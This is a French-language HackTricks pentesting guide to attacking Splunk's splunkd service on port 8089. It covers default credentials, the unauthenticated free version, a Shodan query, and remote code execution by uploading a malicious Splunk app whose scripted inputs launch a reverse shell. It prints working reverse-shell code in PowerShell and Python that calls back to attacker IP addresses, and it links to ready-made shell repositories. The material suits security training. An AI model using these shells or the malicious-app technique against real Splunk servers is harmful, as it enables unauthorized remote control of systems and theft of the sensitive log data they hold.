# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## **Informations de base**

* Outil d'analyse des journaux utilis√© pour la collecte, l'analyse et la visualisation des donn√©es
* Couramment utilis√© dans la surveillance de la s√©curit√© et l'analyse commerciale
* Ports par d√©faut :
* Serveur web : 8000
* Service Splunkd : 8089

### Vecteurs de vuln√©rabilit√© :

1. Exploitation de la version gratuite

* La version d'essai se convertit automatiquement en version gratuite apr√®s 60 jours
* La version gratuite manque d'authentification
* Risque de s√©curit√© potentiel si elle n'est pas g√©r√©e
* Les administrateurs peuvent n√©gliger les implications de s√©curit√©

2. Faiblesses des identifiants

* Anciennes versions : Identifiants par d√©faut `admin:changeme`
* Nouvelles versions : Identifiants d√©finis lors de l'installation
* Potentiel d'utilisation de mots de passe faibles (par exemple, `admin`, `Welcome`, `Password123`)

3. Opportunit√©s d'ex√©cution de code √† distance

* Plusieurs m√©thodes d'ex√©cution de code :
* Applications Django c√¥t√© serveur
* Points de terminaison REST
* Entr√©es script√©es
* Scripts d'alerte
* Support multiplateforme (Windows/Linux)
* Les entr√©es script√©es peuvent ex√©cuter :
* Scripts Bash
* Scripts PowerShell
* Scripts Batch

Potentiel d'exploitation cl√© :

* Stockage de donn√©es sensibles
* Manque d'authentification dans la version gratuite
* Multiples vecteurs pour une potentielle ex√©cution de code √† distance
* Possibilit√© d'exploiter des entr√©es script√©es pour compromettre le syst√®me

### Shodan

* `Splunk build`

## RCE

### Cr√©er une application personnalis√©e

Splunk offre une m√©thode sophistiqu√©e pour l'ex√©cution de code √† distance via le d√©ploiement d'applications personnalis√©es, tirant parti de ses capacit√©s de script multiplateformes. La technique d'exploitation principale consiste √† cr√©er une application malveillante capable d'ex√©cuter des shells invers√©s sur les syst√®mes Windows et Linux.

Une application personnalis√©e peut ex√©cuter **des scripts Python, Batch, Bash ou PowerShell**. De plus, **Splunk est livr√© avec Python install√©**, donc m√™me sur des syst√®mes **Windows**, vous pourrez ex√©cuter du code python.

Vous pouvez utiliser [**cet**](https://github.com/0xjpuff/reverse_shell_splunk) exemple avec le **`bin`** contenant un exemple pour [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) et [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Ou vous pourriez cr√©er le v√¥tre.

Le processus d'exploitation suit une m√©thodologie coh√©rente √† travers les plateformes :
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
Le fichier de configuration critique `inputs.conf` active le script en :

* D√©finissant `disabled = 0`
* Configurant un intervalle d'ex√©cution de 10 secondes
* D√©finissant le type de source du script

Le d√©ploiement est simple :

1. Cr√©er le package d'application malveillant
2. Configurer un √©couteur (Netcat/socat) sur la machine attaquante
3. T√©l√©charger l'application via l'interface de Splunk
4. D√©clencher l'ex√©cution automatique du script lors du t√©l√©chargement

Exemple de shell invers√© Windows PowerShell :
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Exemple de shell invers√© Python sur Linux :
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Escalade de Privil√®ges

Dans la page suivante, vous pouvez trouver une explication sur la fa√ßon dont ce service peut √™tre abus√© pour escalader les privil√®ges et obtenir une persistance :

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
